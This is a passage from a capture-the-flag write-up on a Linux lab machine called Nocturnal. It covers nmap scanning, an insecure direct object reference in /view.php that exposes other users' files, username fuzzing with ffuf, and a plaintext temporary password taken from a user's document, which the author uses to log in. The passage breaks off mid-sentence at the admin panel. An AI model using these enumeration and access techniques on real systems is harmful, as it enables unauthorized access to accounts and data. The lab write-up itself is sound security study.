A classic Linux CTF focusing on web enumeration/exploitation

# Enumeration
## Nmap
after trying out some ports I made this scan
```bash
$ nmap -sC -sV 10.10.11.64 -p22,80,443
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-15 14:55 CEST
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.070s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Adding Vhost
when we try to access the page we get 302
```bash
$ curl 10.10.11.64 -v
..Snip..
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sun, 15 Jun 2025 12:49:46 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://nocturnal.htb/
```

let's go ahead and add the domain to our `/etc/hosts` file
```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

## HTTP Server
after visiting http://nocturnal.htb/ we get greeted with a web app for storing documents. Let's have a closer look.
- Possible SQLi for `/login.php` or `/register.php` *but skipped testing for now.*
- upon logging in we get redirected to `/dashboard.php` where we can upload files
	did some testing for file Upload attacks but the files don't seem to get executed. 
- While trying to find an file Upload attack I found `/view.php` which had a few interesting Parameters
### `/view.php` 
on the dashboard we can access uploaded files via a link to `/view.php?username=porotscho&file=document.odt` which let's us Download the file *so no code execution for now ):* 
But when we refer to file that doesn't exist we can list our files.
![[Screenshot 2025-06-15 153746.png]]
Maybe this skips authentication? Let's make another account and see if we can see his files

Logged in as "porotscho1" we can make a request to `/view.php` with the username parameter set to "porotscho"
![[Screenshot 2025-06-15 153746 1.png]]

Awesome now that we have a PoC we can see if there are more users on the system

```bash
$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -b "PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks" -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 26ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 30ms]
```

In Amanda's files I found a file called privacy.odt the contents have an important clue for us

> [!privacy.odt]
> Dear Amanda,
> 
> Nocturnal has set the following temporary password for you: **arHkG7HAI68X8s1J**. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
> The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us. 
> Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
>
> Yours sincerely, 
> Nocturnal's IT team

Awesome now we can login as Amanda! We should also note that the password has been set for all of her services maybe that could be Important later? 

After logging Into her account I got access to `/admin.php` which was a true gold mine because we can look at source code and 
after looking at the source code of `/admin.php` 